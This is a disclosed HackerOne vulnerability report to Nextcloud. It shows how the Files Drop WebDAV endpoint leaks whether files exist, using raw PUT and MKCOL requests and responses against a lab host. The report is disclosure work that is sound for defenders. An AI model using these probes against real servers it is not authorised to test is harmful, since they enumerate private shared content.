# Files Drop: WebDAV endpoint is leaking existence of resources

## Report Details
- **Report ID**: 187460
- **URL**: https://hackerone.com/reports/187460
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-01T20:02:56.667Z
- **Disclosed**: 2017-01-01T16:49:04.107Z

## Reporter
- **Username**: lukasreschke
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
The new WebDAV endpoint implementation in 11 is leaking too many informations if one executes a `MKCOL` or a `PUT` against an existing item. With Files Drop one should only be able to upload files but not leak any existence of items.

## Leaking existence using PUT

When doing a PUT the expectation is to return a 201. This is normally also the case: 

```
PUT /stable9/public.php/webdav/existingfile.txt HTTP/1.1
Host: 10.211.55.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain
X-OC-Mtime: 1876101427
Authorization: Basic WURxM1ZDT2V3cXZzT3VPOg==
Content-Disposition: attachment; filename="32c3_to_watch.txt"
requesttoken: +m5YTG99huBeunBefEwSzeAMAgmtAafV023vevyQLQg=:nj1uDSxJtbMJ60c6DBVjgNFUemXZLv+FkSOhNs7gZUE=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 4
Cookie: nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true
Connection: close

Test
```

```
HTTP/1.1 201 Created
Date: Thu, 01 Dec 2016 20:00:12 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: ocatqgmmmlsf=uiepm96me8tp8uoji2trrqf071; path=/stable9; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: oc_sessionPassphrase=cGoWWmqv3D27XMXKcbPHLVLXr8uBr%2BCzT2sxXfIpp3PH1L4L3VkMbyqYN58EEZDCylevi1n7I2DI7JNYKMmI0FQK3nVJq5Nqk4JhYzGQ2rIaN%2Fj0iZtVYD3%2F2FJSAcfy; path=/stable9; HttpOnly
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'nonce-V3g0WGZ6VHJHOUlVZTFNWFg2SE8wcWxaZUYvcTNPbXdZcHVXQ0VHQ250TT06TUVoVkZFZkVUTEVtQ3daYUd1djhsSmtQUGhpenY3R0dEK1A1U25EYjBMWT0='; style-src 'self' 'unsafe-inline'; frame-src *; img-src * data: blob:; font-src 'self' data:; media-src *; connect-src *
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: Sameorigin
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
X-OC-MTime: accepted
OC-FileId: 00000050ocatqgmmmlsf
Content-Length: 0
ETag: "ea84893c98a856fe2b23bba48237183a"
OC-ETag: "ea84893c98a856fe2b23bba48237183a"
Connection: close
Content-Type: text/html; charset=UTF-8
```

However, when one does a put to a subresource of an existing file a 409 is returned:

```
PUT /stable9/public.php/webdav/existingfile.txt/foo HTTP/1.1
Host: 10.211.55.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain
X-OC-Mtime: 1876101427
Authorization: Basic WURxM1ZDT2V3cXZzT3VPOg==
Content-Disposition: attachment; filename="32c3_to_watch.txt"
requesttoken: +m5YTG99huBeunBefEwSzeAMAgmtAafV023vevyQLQg=:nj1uDSxJtbMJ60c6DBVjgNFUemXZLv+FkSOhNs7gZUE=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 4
Cookie: nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true
Connection: close

Test
```

```
HTTP/1.1 409 Conflict
Date: Thu, 01 Dec 2016 20:01:05 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: ocatqgmmmlsf=33b0iagf03ne5l2otuabccflg5; path=/stable9; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: oc_sessionPassphrase=heTSMUQ762x78XC0vj9MIwZIkfx5aYIAJBZM7Q48EO3mK%2FJDcWYsAA3yMfgkqhQSFfKYnJe5O9HQ%2FPcvkMwrTuCMre%2FxadgsfSZEob2Re60MFkgZNW3PjjU3nEcyi8ip; path=/stable9; HttpOnly
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'nonce-YmI0OXBEZDdJR1hHbys3NjRXYXJBQUs1eHZ0cDFpSjF1KzI1QjdxamtPcz06T3NSRjdBRVNTbEdsNUszT2toS2RiV2FQaWJrS3RFa1Q5N3YyWGZYcndiND0='; style-src 'self' 'unsafe-inline'; frame-src *; img-src * data: blob:; font-src 'self' data:; media-src *; connect-src *
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: Sameorigin
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Content-Length: 244
Connection: close
Content-Type: application/xml; charset=utf-8

<?xml version="1.0" encoding="utf-8"?>
<d:error xmlns:d="DAV:" xmlns:s="http://sabredav.org/ns">
  <s:exception>Sabre\DAV\Exception\Conflict</s:exception>
  <s:message>Files can only be created as children of collections</s:message>
</d:error>
```

## Leaking existence using MKCOL

If one tries to create a new resource that already exists using MKCOL an error is returned to the user:
```
MKCOL /stable9/public.php/webdav/test.php HTTP/1.1
Host: 10.211.55.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
requesttoken: +m5YTG99huBeunBefEwSzeAMAgmtAafV023vevyQLQg=:nj1uDSxJtbMJ60c6DBVjgNFUemXZLv+FkSOhNs7gZUE=
Authorization: Basic WURxM1ZDT2V3cXZzT3VPOm51bGw=
Cookie: ocs8jj1jf8wp=bbg1t3u974t40t57qqqvmhjm37; oc_sessionPassphrase=H5YF8jijSzbyPHOLr0x98NVURt%2FAJWPOyGLJcFme430Dc19sE0iqjeDORZE8oL99yU457kokq%2FIsTV6cjmS3dF%2FiBAip1z8wCezDQyI0aCgBP1sa9FamXktDGZgAqbuC; ocezyib30iyq=tkk8687bg7ruq55m2trgh9bnn2; ocmt94z1vi7i=pcjpapbhvs92ctc7o2hu9up564; ocjxssn8xoit=69vrq761pp9lk2hctr4vf1oq74; octp32e9roze=j371cd6vq9k2mjibteuen098k1; ocatqgmmmlsf=o0v5a00o67bl0kfmu3v19ta5n3; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true
Connection: close
```

```
HTTP/1.1 405 Method Not Allowed
Date: Thu, 01 Dec 2016 20:01:41 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'nonce-bFZWNFFwSXl3a0pLSXVnUUNtZlpoTEJ5ei9xWkJnL2VIZGpEY2lmUDZHQT06OFFaT0E5RUc4UkVkYzk5MGVqNm95WUVxdDVidEtWZU9YNWFOUGhXL29Daz0='; style-src 'self' 'unsafe-inline'; frame-src *; img-src * data: blob:; font-src 'self' data:; media-src *; connect-src *
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: Sameorigin
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Allow: OPTIONS, GET, HEAD, DELETE, PROPFIND, PUT, PROPPATCH, COPY, MOVE, REPORT
Content-Length: 247
Connection: close
Content-Type: application/xml; charset=utf-8

<?xml version="1.0" encoding="utf-8"?>
<d:error xmlns:d="DAV:" xmlns:s="http://sabredav.org/ns">
  <s:exception>Sabre\DAV\Exception\MethodNotAllowed</s:exception>
  <s:message>The resource you tried to create already exists</s:message>
</d:error>
```


## Attachments
No attachments
